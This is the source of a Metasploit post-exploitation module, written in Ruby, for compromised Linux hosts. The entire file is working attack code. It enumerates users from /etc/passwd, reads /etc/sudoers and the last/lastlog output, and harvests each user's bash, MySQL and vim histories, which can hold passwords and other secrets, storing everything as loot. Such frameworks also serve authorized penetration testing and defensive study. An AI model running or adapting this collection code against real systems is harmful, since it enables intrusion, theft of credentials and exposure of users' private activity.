##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'rex'

class Metasploit3 < Msf::Post

  include Msf::Post::File
  include Msf::Post::Linux::System


  def initialize(info={})
    super( update_info( info,
        'Name'          => 'Linux Gather User History',
        'Description'   => %q{
          This module gathers user specific information.
          User list, bash history, mysql history, vim history,
          lastlog and sudoers.
        },
        'License'       => MSF_LICENSE,
        'Author'        =>
          [
            # based largely on get_bash_history function by Stephen Haywood
            'ohdae <bindshell[at]live.com>'
          ],
        'Platform'      => ['linux'],
        'SessionTypes'  => ['shell', 'meterpreter']
      ))

  end

  def run
    distro = get_sysinfo

    print_good("Info:")
    print_good("\t#{distro[:version]}")
    print_good("\t#{distro[:kernel]}")

    users = execute("/bin/cat /etc/passwd | cut -d : -f 1")
    user = execute("/usr/bin/whoami")

    mount = execute("/bin/mount -l")
    get_bash_history(users, user)
    get_sql_history(users, user)
    get_vim_history(users, user)
    last = execute("/usr/bin/last && /usr/bin/lastlog")
    sudoers = cat_file("/etc/sudoers")

    save("Last logs", last) unless last.nil?
    save("Sudoers", sudoers) unless sudoers.nil? || sudoers =~ /Permission denied/
  end

  def save(msg, data, ctype="text/plain")
    ltype = "linux.enum.users"
    loot = store_loot(ltype, ctype, session, data, nil, msg)
    print_status("#{msg} stored in #{loot.to_s}")
  end

  def get_host
    case session.type
    when /meterpreter/
      host = sysinfo["Computer"]
    when /shell/
      host = session.shell_command_token("hostname").chomp
    end

    print_status("Running module against #{host}")

    return host
  end

  def execute(cmd)
    vprint_status("Execute: #{cmd}")
    output = cmd_exec(cmd)
    return output
  end

  def cat_file(filename)
    vprint_status("Download: #{filename}")
    output = read_file(filename)
    return output
  end

  def get_bash_history(users, user)
    if user == "root" and users != nil
      users = users.chomp.split()
      users.each do |u|
        if u == "root"
          vprint_status("Extracting history for #{u}")
          hist = cat_file("/root/.bash_history")
        else
          vprint_status("Extracting history for #{u}")
          hist = cat_file("/home/#{u}/.bash_history")
        end

        save("History for #{u}", hist) unless hist.nil? || hist =~ /No such file or directory/
      end
    else
      vprint_status("Extracting history for #{user}")
      hist = cat_file("/home/#{user}/.bash_history")
      vprint_status(hist)
      save("History for #{user}", hist) unless hist.nil? || hist =~ /No such file or directory/
    end
  end

  def get_sql_history(users, user)
    if user == "root" and users != nil
      users = users.chomp.split()
      users.each do |u|
        if u == "root"
          vprint_status("Extracting SQL history for #{u}")
          sql_hist = cat_file("/root/.mysql_history")
        else
          vprint_status("Extracting SQL history for #{u}")
          sql_hist = cat_file("/home/#{u}/.mysql_history")
        end

        save("History for #{u}", sql_hist) unless sql_hist.nil? || sql_hist =~ /No such file or directory/
      end
    else
      vprint_status("Extracting SQL history for #{user}")
      sql_hist = cat_file("/home/#{user}/.mysql_history")
      vprint_status(sql_hist) if sql_hist
      save("SQL History for #{user}", sql_hist) unless sql_hist.nil? || sql_hist =~ /No such file or directory/
    end
  end

  def get_vim_history(users, user)
    if user == "root" and users != nil
      users = users.chomp.split
      users.each do |u|
        if u == "root"
          vprint_status("Extracting VIM history for #{u}")
          vim_hist = cat_file("/root/.viminfo")
        else
          vprint_status("Extracting VIM history for #{u}")
          vim_hist = cat_file("/home/#{u}/.viminfo")
        end

        save("VIM History for #{u}", vim_hist) unless vim_hist.nil? || vim_hist =~ /No such file or directory/
      end
    else
      vprint_status("Extracting history for #{user}")
      vim_hist = cat_file("/home/#{user}/.viminfo")
      vprint_status(vim_hist)
      save("VIM History for #{user}", vim_hist) unless vim_hist.nil? || vim_hist =~ /No such file or directory/
    end
  end
end
